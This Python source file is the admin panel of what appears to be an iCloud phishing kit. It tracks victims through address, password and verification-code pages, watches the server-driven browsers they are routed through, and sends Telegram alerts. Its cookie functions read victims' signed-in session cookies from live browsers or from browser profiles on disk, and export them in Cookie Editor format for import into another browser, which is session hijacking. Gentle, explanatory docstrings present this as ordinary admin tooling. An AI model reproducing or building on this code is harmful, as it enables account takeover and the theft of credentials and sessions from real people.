"""The admin panel: the clients, the Telegram settings, and the cookies.

Everything the panel keeps is in one file on disk:

  * the admin's own secret - what /admin asks for before it says anything;
  * the Telegram bot token and the chat id;
  * the sessions that are allowed to have their cookies exported.

The file is written with the permissions of a secret (0600) and it is not in
the repository. Nothing here is ever written into a capture, and no capture
is ever read for it.

The panel shows what the server actually knows: the sessions the server has,
what each one is doing, and where its browser is. It does not make anything
up, and a session that has gone is still listed, so that the panel says what
happened rather than what is happening.

The panel does not keep a list of the clients, and it does not reach into
the server for one. The session manager (sessions.py) is the list: every
client comes through it, and it says what changed. The panel is a
subscriber, and what it shows is what the manager told it - a client
connected, a client went, a client moved to the next step, a browser showed
something new.

The panel then passes it on. A browser tab that is watching the panel holds
one WebSocket to the server, and the server writes to it whenever the
manager has something to say. The panel does not ask the server the same
question every two seconds to find out what the panel has already been told.
"""

import asyncio
import json
import os
import secrets
import time
from pathlib import Path

from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, JSONResponse

import sessions

HERE = Path(__file__).parent

# Where the settings live. The environment variable is for the secret only:
# a secret in a file on disk is a secret in a repository.
STORE_PATH = Path(os.environ.get("ICLOUD_ADMIN_STORE")
                  or (HERE / "admin.json")).resolve()
TOKEN_ENV = "ICLOUD_ADMIN_TOKEN"

# The cookie the admin's own secret is kept in. HttpOnly, so a script on the
# page cannot read it, and SameSite, so it does not travel to other places.
ADMIN_COOKIE = "icloud_admin"

# The panels' own stages, said the way a person would say them.
STAGES = {
    "/src/1.html": "Address",
    "/src/3.html": "Address",
    "/src/4.html": "Password",
    "/src/2.html": "Verification code",
}

# How many things have happened and are still worth showing.
EVENT_LIMIT = 200

EVENTS: list[dict] = []

# The panels that are listening. The server pushes to these when something
# changes, so the panel does not have to ask. They listen to the panel, and
# the panel listens to the session manager: one line of telling, all the way
# down.
LISTENERS: set = set()

# The manager every client comes through. The panel subscribes to it at the
# bottom of this file, once it has somewhere to put what it hears.
MANAGER = sessions.MANAGER


# --------------------------------------------------------------------------
# The store
# --------------------------------------------------------------------------

def _empty() -> dict:
    return {
        "admin_token": "",
        "telegram": {"token": "", "chat_id": "", "enabled": True},
        # The sessions whose cookies may be exported, said by name.
        "exports": {},
    }


class Store:
    """The panel's settings, on disk.

    The file is small and is read and written whole. It is written with
    the permissions of a secret, and it is written atomically, so that a
    crash halfway through cannot leave half a secret behind.
    """

    def __init__(self, path: Path = STORE_PATH):
        self.path = Path(path)
        self.data = _empty()
        self._seen = 0.0
        self.load()

    def load(self) -> None:
        """Read the settings again when the file has changed.

        The secret may be put in the file while the server is running, and
        the panel's own settings are written there - so the file is read
        again when it is newer than the last time it was read.
        """
        try:
            stamp = self.path.stat().st_mtime
        except OSError:
            return
        if stamp == self._seen:
            return
        self._seen = stamp
        try:
            raw = json.loads(self.path.read_text(encoding="utf-8"))
        except FileNotFoundError:
            return
        except Exception:
            # A file that cannot be read is not worth crashing over: the
            # panel starts empty and says so.
            return
        if isinstance(raw, dict):
            self.data = {**_empty(), **raw}

    def save(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        temporary = self.path.with_suffix(".tmp")
        temporary.write_text(json.dumps(self.data, indent=2), encoding="utf-8")
        try:
            os.chmod(temporary, 0o600)
        except OSError:
            pass
        temporary.replace(self.path)
        try:
            os.chmod(self.path, 0o600)
        except OSError:
            pass

    # -- the admin's own secret -------------------------------------------

    def token(self) -> str:
        """The secret /admin asks for.

        The environment has it first: a secret that is in a file on disk is
        a secret that can be committed by accident.
        """
        self.load()
        return os.environ.get(TOKEN_ENV, "").strip() or \
            str(self.data.get("admin_token") or "").strip()

    def set_token(self, value: str) -> None:
        self.data["admin_token"] = value.strip()
        self.save()

    # -- Telegram ---------------------------------------------------------

    def telegram(self) -> dict:
        settings = self.data.get("telegram")
        if not isinstance(settings, dict):
            settings = {}
        return {
            "token": str(settings.get("token") or ""),
            "chat_id": str(settings.get("chat_id") or ""),
            "enabled": bool(settings.get("enabled", True)),
        }

    def set_telegram(self, token: str, chat_id: str, enabled: bool) -> None:
        self.data["telegram"] = {
            "token": token.strip(),
            "chat_id": chat_id.strip(),
            "enabled": bool(enabled),
        }
        self.save()

    # -- the exports ------------------------------------------------------

    def export_allowed(self, sid: str) -> bool:
        exports = self.data.get("exports")
        return bool(isinstance(exports, dict) and exports.get(sid))

    def set_export(self, sid: str, allowed: bool) -> None:
        exports = self.data.get("exports")
        if not isinstance(exports, dict):
            exports = {}
        if allowed:
            exports[sid] = True
        else:
            exports.pop(sid, None)
        self.data["exports"] = exports
        self.save()


STORE = Store()


# --------------------------------------------------------------------------
# What has happened
# --------------------------------------------------------------------------

def note(event: str, **fields) -> None:
    """Something worth seeing in the panel."""
    EVENTS.append({"at": time.time(), "event": event, **fields})
    del EVENTS[:-EVENT_LIMIT]
    push()


def state_message() -> dict:
    """What the panel shows, in the shape the panel reads.

    It is built from the session manager and nothing else - the same list
    the manager holds, with the same revision on it - so two panels looking
    at the same server are looking at the same clients.
    """
    rows = client_list()
    return {
        "t": "state",
        # Every picture the manager has ever said has a number, and the
        # numbers only go up. A panel that has been away can therefore tell
        # that a picture is older than the one it is showing, and not draw
        # itself backwards.
        "revision": MANAGER.revision,
        "clients": rows,
        "events": events(),
        "counts": counts(rows),
    }


def counts(rows=None) -> dict:
    """How many clients there are, and how many of them are here."""
    rows = client_list() if rows is None else rows
    return {
        # Everybody the manager knows about, here or gone.
        "total": len(rows),
        # The sessions the manager is holding right now: connected.
        "live": sum(1 for row in rows if row.get("live")),
        # Somebody is looking at the capture right now.
        "here": sum(1 for row in rows if row.get("here")),
        # Their browser is open, whether or not they are watching.
        "online": sum(1 for row in rows if row.get("browser_open")),
        # They have gone: the browser was closed and they left.
        "gone": sum(1 for row in rows if not row.get("known")),
        "viewers": sum(row.get("viewers", 0) for row in rows),
        "finished": sum(1 for row in rows if row.get("finished")),
        "errors": sum(1 for row in rows if row.get("status") == "error"),
    }


def heard(event: dict) -> None:
    """The session manager said something.

    This is the whole subscription: every client that comes through the
    manager arrives here. A session coming or going is a line in the feed
    as well as a redraw; a session whose browser moved is only a redraw -
    the panel is told, and it draws what the manager holds now.
    """
    kind = event.get("kind")
    sid = event.get("session") or ""
    if kind == "connected":
        note("connected", session=sid)
    elif kind == "back":
        note("back", session=sid)
    elif kind == "gone":
        note("gone", session=sid)
    elif kind == "finished":
        note("finished", session=sid)
    elif kind == "error":
        note("error", session=sid, said=event.get("error") or "")
    else:
        push()


def push() -> None:
    """Tell every listening panel what the manager knows now.

    The panel asked to be told, so this is the answer. It goes to all of
    them: they all want the same thing, and the list is the same for all.
    """
    drop_stale_listeners()
    if not LISTENERS:
        return
    expected = STORE.token()
    message = state_message()
    for listener in list(LISTENERS):
        # A line that was let in with a secret that is no longer the
        # secret does not get to keep listening.
        if expected and listener.secret and \
                not secrets.compare_digest(str(listener.secret), expected):
            LISTENERS.discard(listener)
            # 1008 is "this line is not allowed". The panel knows what to
            # say when it sees it.
            listener.close(1008)
            continue
        try:
            listener.put_nowait(message)
        except Exception:
            LISTENERS.discard(listener)


def events(limit: int = 40) -> list[dict]:
    """The most recent things that happened, newest first."""
    return list(reversed(EVENTS[-limit:]))


# --------------------------------------------------------------------------
# The cookies
# --------------------------------------------------------------------------

def cookie_editor(cookies) -> list[dict]:
    """The browser's cookies as Cookie Editor's export.

    Cookie Editor reads a JSON array of these, and writes the same, so the
    file this makes can be dropped straight into it - and the cookies it
    holds can be put back into a browser by hand.
    """
    out = []
    for cookie in cookies or []:
        domain = str(cookie.get("domain") or "")
        entry = {
            "domain": domain,
            # A domain that starts with a dot is shared with the
            # subdomains; one that does not is only for that host.
            "hostOnly": not domain.startswith("."),
            "httpOnly": bool(cookie.get("httpOnly")),
            "name": str(cookie.get("name") or ""),
            "path": str(cookie.get("path") or "/"),
            "sameSite": None,
            "secure": bool(cookie.get("secure")),
            "session": not cookie.get("expires"),
            "storeId": None,
            "value": str(cookie.get("value") or ""),
        }
        expires = cookie.get("expires")
        if expires:
            entry["expirationDate"] = expires
        out.append(entry)
    return out


def mask(token: str) -> str:
    """A token, with most of it hidden: enough to tell two apart."""
    token = (token or "").strip()
    if len(token) <= 8:
        return "•" * len(token)
    return f"{token[:4]}••••••{token[-4:]}"


# --------------------------------------------------------------------------
# The panel
# --------------------------------------------------------------------------

def drop_stale_listeners() -> None:
    """Close the lines whose secret is no longer the secret.

    A secret that is changed is a secret the old lines were not given.
    They are closed - with the code that says so - rather than left
    carrying on with a secret that has been taken away.
    """
    expected = STORE.token()
    if not expected:
        return
    for listener in list(LISTENERS):
        if listener.secret and not secrets.compare_digest(
                str(listener.secret), expected):
            LISTENERS.discard(listener)
            listener.close(1008)


class PanelListener:
    """One panel, listening.

    Messages go through a queue, as they do for the capture's own viewers:
    a panel that has stopped reading must not hold up the server, and a
    full queue drops the oldest update rather than blocking.
    """

    def __init__(self, websocket: WebSocket, secret: str = ""):
        self.websocket = websocket
        # The secret this line was let in with. A secret that is changed
        # afterwards is a secret this line was not given, so the line is
        # closed rather than left carrying on.
        self.secret = secret
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=50)
        self.task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            message = await self.queue.get()
            await self.websocket.send_json(message)

    def put_nowait(self, message: dict) -> None:
        try:
            self.queue.put_nowait(message)
        except asyncio.QueueFull:
            pass
        except Exception:
            pass

    def close(self, code: int = 1000) -> None:
        """Close the line, and say why when it was not allowed."""
        self.task.cancel()
        try:
            asyncio.ensure_future(self.websocket.close(code=code))
        except Exception:
            pass


def stage_of(session) -> str:
    """Where this session is, said the way a person would say it."""
    if session.hub.finished:
        return "Signed in"
    page = session.hub.page or ""
    return STAGES.get(page, "Starting")


def client_row(session, store: Store) -> dict:
    """What the panel shows of one session.

    "Active" means the browser is open and there is somebody in it. A
    session whose browser has been closed is not active, however recently
    it was here - and one that is being worked in is more active than one
    that has been left alone at the password step.
    """
    idle = max(0.0, time.monotonic() - session.seen)
    browser = session.hub.browser or {}
    browser_open = bool(session.state.get("browser_open"))
    viewers = len(session.hub.viewers)
    return {
        "id": session.id,
        # The manager is holding this session right now: the client is
        # connected. It is said separately from "online", because a client
        # who has just opened the app is connected before their browser is
        # up - and the panel should say that, not "idle".
        "live": True,
        # Online means the server is driving this client's browser right
        # now. That is what "online" means here, and it is the difference
        # between a client the panel can watch and one it can only read.
        "online": browser_open,
        "status": ("active" if browser_open
                   else session.state.get("status", "idle")),
        "stage": stage_of(session),
        "page": session.hub.page,
        "step": session.state.get("step", ""),
        "error": session.state.get("error", ""),
        "browser_open": browser_open,
        "browser_url": browser.get("url", ""),
        "browser_title": browser.get("title", ""),
        "viewers": viewers,
        # Somebody is looking at the capture right now. This is what tells
        # the panel that a person is here, as opposed to a session that is
        # only still remembered.
        "here": viewers > 0,
        "waiting": bool(session.waiting),
        "finished": bool(session.hub.finished),
        "idle_seconds": round(idle, 1),
        "export_allowed": store.export_allowed(session.id),
        "profile": session.profile().name,
        "known": True,
    }


def gone_row(sid: str, record: dict, store: Store) -> dict:
    """What the panel shows of a visitor who is not here any more.

    A visitor whose browser has been shut down is still a visitor: their
    profile is on disk, their browser remembers them, and the panel says
    where they got to and when they were last here.
    """
    seen = record.get("seen")
    idle = max(0.0, time.time() - seen) if isinstance(seen, (int, float)) else 0.0
    return {
        "id": sid,
        "live": False,
        "online": False,
        "status": "gone",
        "stage": record.get("stage", "—") if record else "Unknown",
        "page": record.get("page", ""),
        "step": "",
        "error": "",
        "browser_open": False,
        "browser_url": record.get("url", "") if record else "",
        "browser_title": record.get("title", "") if record else "",
        "viewers": 0,
        "waiting": False,
        "here": False,
        "finished": bool(record.get("finished")) if record else False,
        "idle_seconds": round(idle, 1),
        "export_allowed": store.export_allowed(sid),
        "profile": sid,
        "known": False,
    }


def every_client(store: Store) -> list[dict]:
    """Every client the server knows about.

    A client is a visitor: their folder in ``visitors/`` is their
    browser's profile, and it is there whether they are here or not. The
    ones whose browser is running right now are **online** - the server is
    driving that browser, and the panel can say exactly where it is and
    what it is showing. The ones whose browser is shut down are
    **offline**: their profile is on disk, their cookies are in it, and
    the panel can still read them.

    So both are listed, and the panel says which is which.

    The list itself comes from the session manager, and from nothing else:
    the sessions it is holding, the visitors it remembers putting away,
    and the profiles on disk it has not met yet. There is no second list
    for the panel to disagree with.
    """
    rows = [client_row(session, store) for session in MANAGER.values()]

    seen = {row["id"] for row in rows}
    for sid, record in MANAGER.gone.items():
        if sid not in seen:
            rows.append(gone_row(sid, record, store))
            seen.add(sid)

    # The ones who have not been here since the server started: their
    # profile is on disk from an earlier run. They are still clients -
    # their cookies are in that folder - so they are on the list, and the
    # panel can open their profile and read them.
    for sid in MANAGER.on_disk():
        if sid in seen:
            continue
        rows.append(offline_row(sid, store))
        seen.add(sid)

    # The ones the manager is holding come before the ones it remembers,
    # and among those the ones whose browser is running come first.
    rows.sort(key=lambda row: (not row["live"],
                                not row["browser_open"],
                                row["idle_seconds"]))
    return rows


def client_list() -> list[dict]:
    """The list of clients, for the panel that is listening."""
    return every_client(STORE)


def offline_row(sid: str, store: Store) -> dict:
    """A client whose browser is shut down but whose profile is on disk.

    Their folder in ``visitors/`` is their browser's memory: the cookies
    they had, the sign-in they did last time. It is on disk, so the panel
    can open it and read them, and it is not open now, so the panel cannot
    say where their browser is - only what they got to last time.
    """
    profile = MANAGER.profile(sid)
    return {
        "id": sid,
        "live": False,
        "status": "offline",
        "stage": "Offline",
        "page": "",
        "step": "",
        "error": "",
        "browser_open": False,
        "browser_url": "",
        "browser_title": "",
        "viewers": 0,
        "waiting": False,
        "here": False,
        "online": False,
        "finished": False,
        "idle_seconds": 0.0,
        "export_allowed": store.export_allowed(sid),
        "profile": sid,
        "known": True,
        "profile_path": str(profile),
    }


def _authed(request: Request, store: Store) -> bool:
    """Is this request the admin's?"""
    expected = store.token()
    if not expected:
        return False
    given = request.cookies.get(ADMIN_COOKIE, "")
    if not given:
        header = request.headers.get("x-admin-token", "")
        given = header
    return bool(given) and secrets.compare_digest(str(given), expected)


def _denied(message: str, status: int = 403):
    return JSONResponse({"error": message}, status_code=status)


def build_router() -> APIRouter:
    """The panel's routes."""
    router = APIRouter(prefix="/admin", tags=["admin"])

    @router.get("")
    @router.get("/")
    async def panel():
        """The panel itself. It holds no secrets: everything it shows comes
        from the API, and the API asks for the admin's secret."""
        return FileResponse(HERE / "admin.html",
                            headers={"Cache-Control": "no-store"})

    @router.get("/fonts.css")
    async def fonts():
        """The panel's own font.

        Space Grotesk is served from here and not from a font house: the
        panel is for the operator, and it should look the same whether the
        machine has a network or not. The font is in the stylesheet itself,
        so there is no file to go missing.
        """
        return FileResponse(HERE / "fonts.css", media_type="text/css",
                            headers={"Cache-Control": "public, max-age=604800"})

    # -- the admin's own secret -------------------------------------------

    @router.post("/api/login")
    async def login(request: Request):
        body = await _body(request)
        given = str(body.get("token") or "")
        expected = STORE.token()
        if not expected:
            return JSONResponse({
                "error": "no admin secret has been set. Set ICLOUD_ADMIN_TOKEN "
                         "in the environment, or put one in admin.json."
            }, status_code=503)
        if not given or not secrets.compare_digest(given, expected):
            return _denied("that is not the admin's secret")
        response = JSONResponse({"ok": True})
        response.set_cookie(
            ADMIN_COOKIE, given, httponly=True, samesite="strict",
            path="/", max_age=7 * 24 * 3600)
        return response

    @router.post("/api/logout")
    async def logout():
        response = JSONResponse({"ok": True})
        response.delete_cookie(ADMIN_COOKIE, path="/")
        return response

    @router.get("/api/session")
    async def session_info(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        return {"ok": True, "token_set": bool(store.token())}

    # -- the clients ------------------------------------------------------

    @router.websocket("/ws")
    async def panel_socket(websocket: WebSocket):
        """The panel's line to the server.

        A browser tab that is watching the panel holds this line, and the
        server writes on it whenever the session manager says something:
        a client connected, a client went, a client moved to the next step,
        a browser showed something new. The panel does not ask the same
        question over and over to find out what the server already knows.

        The secret is asked for first. A line that is not let in is
        closed, and nothing is said on it.
        """
        given = websocket.cookies.get(ADMIN_COOKIE, "")
        expected = STORE.token()
        allowed = bool(expected and given and
                       secrets.compare_digest(str(given), expected))

        # The line is accepted first, and then closed if it is not allowed.
        # A line that is closed before it is accepted cannot be closed
        # with a code at all, and the panel would not know why.
        await websocket.accept()
        if not allowed:
            await websocket.close(code=1008)
            return

        listener = PanelListener(websocket, str(given))
        LISTENERS.add(listener)
        try:
            # What the manager knows right now, so the panel does not
            # have to wait for the next thing to happen to find out.
            listener.put_nowait(state_message())
            while True:
                # The panel has nothing to say - it only listens. But the
                # connection has to be read from, so that a closed one is
                # noticed and cleaned up.
                await websocket.receive_text()
        except WebSocketDisconnect:
            pass
        except Exception:
            pass
        finally:
            LISTENERS.discard(listener)
            listener.close()

    @router.get("/api/clients")
    async def clients(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        rows = every_client(store)
        return {
            "revision": MANAGER.revision,
            "clients": rows,
            "events": events(),
            # The counts are the same ones the panel is pushed, worked out
            # by the same function, so a panel that asks and a panel that
            # is told cannot disagree about how many clients there are.
            "counts": counts(rows),
        }

    # -- Telegram ---------------------------------------------------------

    @router.get("/api/telegram")
    async def telegram_get(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        settings = store.telegram()
        return {
            "token_set": bool(settings["token"]),
            "token_masked": mask(settings["token"]),
            "chat_id": settings["chat_id"],
            "enabled": settings["enabled"],
        }

    @router.post("/api/telegram")
    async def telegram_save(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        body = await _body(request)
        current = store.telegram()
        token = body.get("token")
        token = str(token).strip() if isinstance(token, str) and token.strip() \
            else current["token"]
        chat_id = body.get("chat_id")
        chat_id = str(chat_id).strip() if isinstance(chat_id, str) else \
            current["chat_id"]
        enabled = body.get("enabled")
        enabled = bool(enabled) if isinstance(enabled, bool) else current["enabled"]
        store.set_telegram(token, chat_id, enabled)
        return {
            "ok": True,
            "token_set": bool(store.telegram()["token"]),
            "token_masked": mask(store.telegram()["token"]),
            "chat_id": store.telegram()["chat_id"],
            "enabled": store.telegram()["enabled"],
        }

    @router.post("/api/telegram/test")
    async def telegram_test(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        import telegram as telegram_module
        settings = store.telegram()
        if not settings["enabled"]:
            return _denied("the Telegram notifications are turned off")
        went, said = await telegram_module.send(
            settings["token"], settings["chat_id"],
            telegram_module.describe("The test message. The notifications work."))
        return {"ok": went, "said": said}

    # -- the cookies ------------------------------------------------------

    @router.get("/api/cookies")
    async def own_cookies(request: Request):
        """The cookies of the session this browser is signed in as.

        Their own session, and nobody else's: the visitor's name is in the
        request's cookie, and the session it names is the only one that is
        read.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        sid = sessions.visitor_of(request)
        session = MANAGER.lookup(sid)
        if session is None:
            return _denied("this browser has no session of its own yet",
                           status=404)
        cookies = await cookies_of(session.id)
        return {"session": session.id, "cookies": cookie_editor(cookies)}

    @router.get("/api/clients/{sid}/cookies")
    async def client_cookies(sid: str, request: Request):
        """The cookies of a session that has been allowed to be exported.

        A session is not exported because somebody asked: it is exported
        because it has been allowed, by name, in the panel - or because the
        request is the session's own visitor.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        if not known_client(sid):
            return _denied("there is no such client", status=404)
        if not store.export_allowed(sid) and sessions.visitor_of(request) != sid:
            return _denied("this client has not been allowed to be exported")
        cookies = await cookies_of(sid)
        here = MANAGER.get(sid)
        return {"session": sid, "cookies": cookie_editor(cookies),
                "online": bool(here and here.state.get("browser_open"))}

    @router.post("/api/clients/{sid}/export")
    async def allow_export(sid: str, request: Request):
        """Allow a session's cookies to be exported, or say no."""
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        if not known_client(sid):
            return _denied("there is no such client", status=404)
        body = await _body(request)
        allowed = bool(body.get("allowed"))
        store.set_export(sid, allowed)
        return {"ok": True, "export_allowed": store.export_allowed(sid)}

    return router


# The panel's routes, made once: the server mounts them, and the tests
# call them.
ROUTER = build_router()


# --------------------------------------------------------------------------
# The small helpers
# --------------------------------------------------------------------------

async def _body(request: Request) -> dict:
    try:
        raw = await request.body()
        parsed = json.loads(raw.decode("utf-8")) if raw else {}
    except Exception:
        return {}
    return parsed if isinstance(parsed, dict) else {}


async def _cookies_of(session) -> list[dict]:
    """The cookies this session's browser holds."""
    context = getattr(session, "ctx", None)
    if context is None:
        return []
    try:
        return await context.cookies()
    except Exception:
        return []


async def cookies_of(sid: str) -> list[dict]:
    """The cookies of a client, whether they are here or not.

    A client whose browser is running is asked for its cookies directly.

    A client whose browser is shut down still has them: they are in the
    profile folder on disk, and the folder is that browser's memory. So
    the folder is opened - quietly, without a window, and closed again
    straight away - and the cookies are read out of it. The profile that
    did the signing in is the profile that holds the sign-in.

    The cookies that were read while the browser was open are kept with
    the record of that client, and are used when the folder cannot be
    opened - which is the case when the browser is still holding it.
    """
    session = MANAGER.get(sid)
    if session is not None:
        cookies = await _cookies_of(session)
        if cookies:
            return cookies

    record = MANAGER.gone.get(sid) or {}
    kept = record.get("cookies")
    if isinstance(kept, list) and kept:
        return kept

    return await read_profile_cookies(sid)


async def read_profile_cookies(sid: str) -> list[dict]:
    """The cookies in a client's profile folder on disk.

    The folder is opened quietly - no window, nothing shown - and closed
    again as soon as the cookies have been read. It is the same folder the
    visitor's own browser uses, so the cookies in it are the cookies that
    browser had.
    """
    if not sessions.SESSION_ID.match(sid or ""):
        return []
    folder = MANAGER.profile(sid)
    if not folder.is_dir():
        return []

    from playwright.async_api import async_playwright

    context = None
    playwright = None
    try:
        playwright = await async_playwright().start()
        context = await playwright.chromium.launch_persistent_context(
            str(folder), headless=True, no_viewport=True,
            args=["--no-sandbox", "--disable-gpu"])
        return await context.cookies()
    except Exception:
        return []
    finally:
        try:
            if context is not None:
                await context.close()
        except Exception:
            pass
        try:
            if playwright is not None:
                await playwright.stop()
        except Exception:
            pass


def known_client(sid: str) -> bool:
    """Is this a client the server knows about?

    A client is a visitor: a session, a record of one that has gone, or a
    profile folder on disk. The folder is their browser's memory, so there
    is something real to be done with it - their cookies can be read out
    of it.
    """
    return MANAGER.knows(sid)


# --------------------------------------------------------------------------
# The panel listens
# --------------------------------------------------------------------------
#
# This is the subscription. The manager does not know what a panel is, and
# the panel does not ask the manager for a list: it is told, once, that
# there is something to hear. Everything a thing needs to be said - the
# store, the event log, the line to the panel - is defined above, which is
# why the subscription is made here and not at the top.
MANAGER.subscribe(heard)
